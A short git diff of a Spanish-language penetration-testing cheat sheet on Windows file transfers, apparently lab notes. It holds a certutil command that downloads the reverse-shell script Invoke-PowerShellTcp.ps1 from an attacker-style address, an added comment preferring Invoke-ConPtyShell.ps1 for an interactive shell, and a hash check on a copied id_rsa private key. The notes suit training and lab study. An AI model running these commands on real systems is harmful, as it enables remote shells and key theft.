@@ -9,7 +9,6 @@ Comprobar md5 del archivo
 ```powershell
 Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
 ```
-
 #### Powershell - Web Downloads
 ##### Descargar un fichero - DownloadFile
 ```powershell
@@ -443,6 +442,7 @@ Actualmente hay dos sitios web que recopilan información sobre los archivos bin
 ### Ejemplo de descarga de archivo en Windows con certutil
 ```powershell
 certutil.exe -urlcache -split -f http://10.10.14.104:8000/Invoke-PowerShellTcp.ps1 C:\Windows\Temp\Invoke-PowerShellTcp.ps1  
+# Considerar Invoke-ConPtyShell.ps1 en su lugar, ya que nos da una tty interactiva
 ```
 ---
 ## Ejemplo de descarga y ejecución 
